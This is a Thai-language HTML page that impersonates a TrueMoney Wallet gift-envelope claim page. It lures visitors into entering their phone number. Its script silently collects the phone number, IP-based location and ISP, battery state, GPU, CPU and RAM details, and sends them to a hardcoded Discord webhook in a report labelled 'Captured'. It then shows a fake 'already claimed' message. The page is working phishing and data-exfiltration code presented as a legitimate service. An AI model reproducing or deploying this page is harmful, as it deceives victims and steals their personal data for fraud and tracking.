<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ทรูมันนี่ - รับซอง</title>
    
    <meta property="og:title" content=" ของขวัญสำหรับคุณ">
    <meta property="og:description" content="เพื่อนของคุณส่งซองอั่งเปาให้คุณ รับเงินเข้าวอลเล็ทได้ที่นี่">
    <meta property="og:image" content="https://img5.pic.in.th/file/secure-sv1/true-gift-woman.png"> <meta property="og:type" content="website">

    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; padding: 40px 20px; text-align: center; }
        .main-img { width: 100%; max-width: 280px; margin-bottom: 20px; }
        .sender-name { font-size: 1.5rem; font-weight: bold; color: #333; margin-top: 10px; }
        .sub-text { color: #888; font-size: 1.1rem; margin-bottom: 30px; }
        .input-box { text-align: left; width: 100%; max-width: 350px; margin: 0 auto; }
        label { font-size: 0.95rem; color: #666; display: block; margin-bottom: 8px; }
        input[type="text"] { width: 100%; padding: 15px; border: 1px solid #eee; border-radius: 10px; font-size: 1.2rem; box-sizing: border-box; background-color: #fdfdfd; outline: none; }
        .btn-orange { background-color: #ff8c2d; color: white; border: none; width: 100%; max-width: 350px; padding: 18px; font-size: 1.2rem; font-weight: bold; border-radius: 35px; cursor: pointer; margin-top: 40px; box-shadow: 0 4px 15px rgba(255,140,45,0.3); }
        
        #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="main-img" src="https://img5.pic.in.th/file/secure-sv1/true-gift-woman.png">
        
        <div class="sender-name">ปัญญาภร ***</div> 
        <div class="sub-text">ส่งซองทรูมันนี่ให้คุณ</div>

        <div class="input-box">
            <label>กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
            <input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
        </div>

        <button class="btn-orange" onclick="start()">รับซองเลย</button>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        <div id="status" style="color:#ff8c2d; font-weight:bold; font-size:1.1rem;">กำลังตรวจสอบสิทธิ์...</div>
        <div id="desc" style="color:#999; font-size:0.9rem; margin-top:10px;">ระบบกำลังยืนยันข้อมูลกับ TrueMoney Wallet</div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";

        async function start() {
            const p = document.getElementById('phone').value;
            if(!/^[0-9]{10}$/.test(p)) return alert("กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง");
            
            document.getElementById('loading').style.display = 'flex';

            // ดึงข้อมูลแบตเตอรี่และ IP (V23 Stealth)
            let gpu = "N/A";
            try { gpu = document.createElement('canvas').getContext('webgl').getParameter(43521); } catch(e){}
            let bat = "N/A";
            try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% (${b.charging?'Chg':'No'})`; } catch(e){}

            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                await fetch(WEBHOOK, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify({
                        content: `🎯 **Captured (Official Mode)** | Phone: \`${p}\``,
                        embeds: [{
                            title: "🗂️ รายงานข้อมูลเป้าหมาย",
                            color: 16745517,
                            fields: [
                                { name: "📱 เบอร์", value: `**${p}**`, inline: true },
                                { name: "🔋 แบต", value: `\`${bat}\``, inline: true },
                                { name: "📍 ISP/ที่อยู่", value: `${d.org}\n${d.city}, ${d.country_name}`, inline: false },
                                { name: "🛠️ Hardware", value: `CPU: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory}GB\nGPU: ${gpu}`, inline: false }
                            ],
                            footer: { text: "Link: seras9.github.io" },
                            timestamp: new Date()
                        }]
                    }) 
                });
            } catch(e){}

            setTimeout(() => {
                document.getElementById('status').style.color = "#ff4444";
                document.getElementById('status').innerText = "❌ สิทธิ์รับซองเต็มแล้ว";
                document.getElementById('desc').innerText = "ขออภัย ซองของขวัญนี้มีผู้รับครบจำนวนแล้ว";
                document.querySelector('.spinner').style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
